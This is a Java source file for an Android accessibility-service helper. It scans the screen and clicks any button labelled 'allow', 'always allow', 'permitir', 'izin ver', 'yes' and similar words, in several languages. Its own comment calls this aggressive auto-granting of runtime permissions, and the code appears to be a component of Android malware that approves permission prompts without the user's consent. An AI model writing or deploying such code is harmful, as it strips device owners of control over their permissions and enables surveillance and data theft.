package com.java.panel;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityEvent;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

/**
 * Aggressive auto-grant of runtime permissions via Accessibility.
 * Navigates permission dialogs and taps Allow / While using the app / Always.
 */
public class AutoPermissionHelper {

    private static boolean enabled = true;
    private static final String[] ALLOW_KEYWORDS = {
            "allow", "enquanto usa o app", "while using the app", "only this time",
            "apenas desta vez", "sempre permitir", "always allow", "permitir",
            "izin ver", "kabul et", "grant", "aceitar", "ok", "sim", "yes",
            "allow all the time", "permitir o tempo todo", "permitir durante o uso",
            "while using this app", "allow only while using the app"
    };

    public static void setEnabled(boolean v) { enabled = v; }
    public static boolean isEnabled() { return enabled; }

    public static void processEvent(AccessibilityEvent event, AccessibilityService service) {
        if (!enabled || event == null || service == null) return;
        try {
            if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                    && event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                return;
            }
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root == null) return;
            try {
                clickAllowNodes(root);
            } finally {
                root.recycle();
            }
        } catch (Exception ignored) {}
    }

    private static void clickAllowNodes(AccessibilityNodeInfo node) {
        if (node == null) return;
        CharSequence textCs = node.getText();
        CharSequence descCs = node.getContentDescription();
        String text = textCs != null ? textCs.toString().toLowerCase(Locale.ROOT) : "";
        String desc = descCs != null ? descCs.toString().toLowerCase(Locale.ROOT) : "";
        String combined = text + " " + desc;

        boolean isClickable = node.isClickable() || node.isCheckable();
        if (isClickable) {
            for (String kw : ALLOW_KEYWORDS) {
                if (combined.contains(kw)) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return;
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                try {
                    clickAllowNodes(child);
                } finally {
                    child.recycle();
                }
            }
        }
    }

    public static String status() {
        return "🔐 Auto-permission: " + (enabled ? "ON" : "OFF");
    }
}
